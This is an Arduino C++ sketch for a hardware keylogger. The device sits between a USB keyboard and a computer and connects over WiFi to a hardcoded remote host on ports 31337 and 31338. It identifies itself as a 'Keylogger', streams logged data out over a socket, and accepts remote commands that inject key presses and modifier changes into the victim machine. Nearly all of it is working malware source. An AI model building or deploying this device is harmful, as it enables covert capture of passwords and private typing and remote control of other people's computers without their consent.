#define USE_LCD

#ifdef USE_LCD
#include <LiquidCrystal.h>
LiquidCrystal lcd(A5, A4, A3, A2, A1, A0);
int line = 0;
#endif

#include <SPI.h>
#include <Adafruit_WINC1500.h>
#include "CircularBuffer.h"
#include "KeyboardHandler.h"
#include "keylogger.h"

// Define the WINC1500 board connections below.
// If you're following the Adafruit WINC1500 board
// guide you don't need to modify these:
#define WINC_CS   8
#define WINC_IRQ  7
#define WINC_RST  4
#define WINC_EN   2     // or, tie EN to VCC and comment this out
// The SPI pins of the WINC1500 (SCK, MOSI, MISO) should be
// connected to the hardware SPI port of the Arduino.
// On an Uno or compatible these are SCK = #13, MISO = #12, MOSI = #11.
// On an Arduino Zero use the 6-pin ICSP header, see:
//   https://www.arduino.cc/en/Reference/SPI

// Setup the WINC1500 connection with the pins above and the default hardware SPI.
Adafruit_WINC1500 WiFi(WINC_CS, WINC_IRQ, WINC_RST);

// Or just use hardware SPI (SCK/MOSI/MISO) and defaults, SS -> #10, INT -> #7, RST -> #5, EN -> 3-5V
//Adafruit_WINC1500 WiFi;

#define STAT_LED 13
char ssid[] = "xXSwaggernautsXx";     //  your network SSID (name)
char pass[] = "chillywilly";    // your network password (use for WPA, or use as key for WEP)
int keyIndex = 0;                // your network key Index number (needed only for WEP)

// Change below hosts and ports as necessary
IPAddress host(172,16,210,1);
//char host[] = "";
int port = 31337;
//char *debughost = host;
IPAddress debughost = host;
int debugport = 31338;

Adafruit_WINC1500Client client;
Adafruit_WINC1500Client debug;
KeyboardHandler handler;
CircularBuffer<char*> logBuffer;
CircularBuffer<uint8_t> inputBuffer; 

uint32_t last_connect_attempt;
bool connect_in_progress;

uint8_t last_modifiers = 0;
uint8_t keyboard_modifiers = 0;

extern "C" char *sbrk(int i);
 
int FreeRam () {
  char stack_dummy = 0;
  return &stack_dummy - sbrk(0);
}

inline bool isConnected() {
  return WiFi.status() == WL_CONNECTED && client.connected();
}

void halt() {
  while(true) {
    digitalWrite(STAT_LED, HIGH);
    delay(100);
    digitalWrite(STAT_LED, LOW);
    delay(100);
  }
}

void addToLog(char *output) {
  logBuffer.add(output);
}

void setup() {
  // Tell the Teensy to reset keyboard communications by triggering interrupt
  pinMode(5, OUTPUT);
  digitalWrite(5, LOW);
  
  // Begin serial communications with USB keyboard emulator
  Serial1.begin(57600);

  #ifdef USE_LCD
  lcd.begin(20,4);
  lcd.clear();
  lcd.setCursor(0, line++ % 3);
  lcd.print("Initializing");
  #endif
  
  #ifdef WINC_EN
  pinMode(WINC_EN, OUTPUT);
  digitalWrite(WINC_EN, HIGH);
  #endif

  pinMode(STAT_LED, OUTPUT);
  digitalWrite(STAT_LED, HIGH);

  // Halt if no WiFi hardware installed
  if(WiFi.status() == WL_NO_SHIELD) {
    #ifdef USE_LCD
    lcd.setCursor(0, line++ % 3);
    lcd.print("No shield");
    #endif
    halt();
  }

  #ifdef USE_LCD
  lcd.setCursor(0, line++ % 3);
  lcd.print("Init USB");
  #endif
  
  handler.setLogCallback(addToLog);
  handler.init();

  // Assumes WPA/WPA2 network, attempt to connect
  last_connect_attempt = millis();
  connect_in_progress = true;

  #ifdef USE_LCD
  lcd.setCursor(0, line++ % 3);
  lcd.print("Begin connect");
  lcd.setCursor(0, 3);
  lcd.print("     /32768");
  #endif
  
  // Change below line if using unsecured or WEP network (not recommended)
  WiFi.beginAsync(ssid, pass);
}

unsigned long lastTime = millis();
char strbuf[16];

// Loop will execute about every 5ms
void loop() {
  unsigned long t = lastTime;
  lastTime = millis();
  handler.task();
  WiFi.refresh();

  #ifdef USE_LCD
  lcd.setCursor(0,3);
  sprintf(strbuf, "%05d/32768", FreeRam());
  lcd.print(strbuf);
  
  lcd.setCursor(16, 3);
  int delta = (int) lastTime - t;
  sprintf(strbuf, "%02dms", delta);
  lcd.print(strbuf);
  #endif
  
  // Attempt to connect/reconnect if disconnected
  switch(WiFi.status()) {
    case WL_CONNECTED:
      if(connect_in_progress && millis() - last_connect_attempt > 5000) {
        last_connect_attempt = millis();
        if(client.connect(host, port) && debug.connect(debughost, debugport)) {
          #ifdef USE_LCD
          lcd.setCursor(0, line++ % 3);
          lcd.print("Connected   ");
          #endif
          
          connect_in_progress = false;
          digitalWrite(STAT_LED, LOW);
          client.println("Keylogger");
          printWifiStatus();
          debug.println("Debug");
        }
      }
      break;
    case WL_IDLE_STATUS:
      if(connect_in_progress && millis() - last_connect_attempt < 30000) {
        // waiting for connection timeout, do nothing
        break;
      }
    default:
      #ifdef USE_LCD
      lcd.setCursor(0, line++ % 3);
      lcd.print("Connection failed");
      #endif
      digitalWrite(STAT_LED, HIGH);
      last_connect_attempt = millis();
      connect_in_progress = true;
      WiFi.beginAsync(ssid, pass);
  }

  if(isConnected() && logBuffer.getNumEntries() > 0) {
    char *str = logBuffer.peek();
    size_t err = debug.writeAsync((uint8_t*)str, strlen(str));
    if(err >= 0) {
      // Write successful, remove from circular buffer
      logBuffer.remove();
    }
  }

  // handle incoming commands from the server
  if(client.available() > 0) {
    uint8_t socketBuf[128];
    int bytesRead = client.read(socketBuf, 128);
    inputBuffer.add(socketBuf, bytesRead);
  }
  while(inputBuffer.getNumEntries() >= 4) {
    uint8_t command[4];
    inputBuffer.remove(command, 4);
    switch(command[0]) {
      case CMD_PRESS:
      case CMD_RELEASE:
      case CMD_CHANGEMOD:
        Serial1.write(command, 3);
        logBuffer.add("ACK\r\n");
        break;
      default:
        break;
    }
  }
}


void printWifiStatus() {
  // print the SSID of the network you're attached to:
  client.print("SSID: ");
  client.println(WiFi.SSID());

  // print your WiFi shield's IP address:
  IPAddress ip = WiFi.localIP();
  client.print("IP Address: ");
  client.println(ip);

  // print the received signal strength:
  long rssi = WiFi.RSSI();
  client.print("signal strength (RSSI):");
  client.print(rssi);
  client.println(" dBm");
}

void controlKeysChanged() {
  int key = handler.getModifiers();
  uint8_t command[3];
  command[0] = (uint8_t) (CMD_CHANGEMOD & 0xFF);
  command[1] = (uint8_t) ((key & 0xFF00) >> 8);
  command[2] = (uint8_t) (key & 0xFF);
  Serial1.write(command, 3);
}

void keyPressed() {
  int key = handler.getOemKey();
  uint8_t command[3];
  command[0] = (uint8_t) (CMD_PRESS & 0xFF);
  command[1] = (uint8_t) ((key & 0xFF00) >> 8);
  command[2] = (uint8_t) (key & 0xFF);
  Serial1.write(command, 3);
  handler.pressed(key & 0xFF);
}
void keyReleased() {
  int key = handler.getOemKey();
  uint8_t command[3];
  command[0] = (uint8_t) (CMD_RELEASE & 0xFF);
  command[1] = (uint8_t) ((key & 0xFF00) >> 8);
  command[2] = (uint8_t) (key & 0xFF);
  Serial1.write(command, 3);
  handler.released(key & 0xFF);
}

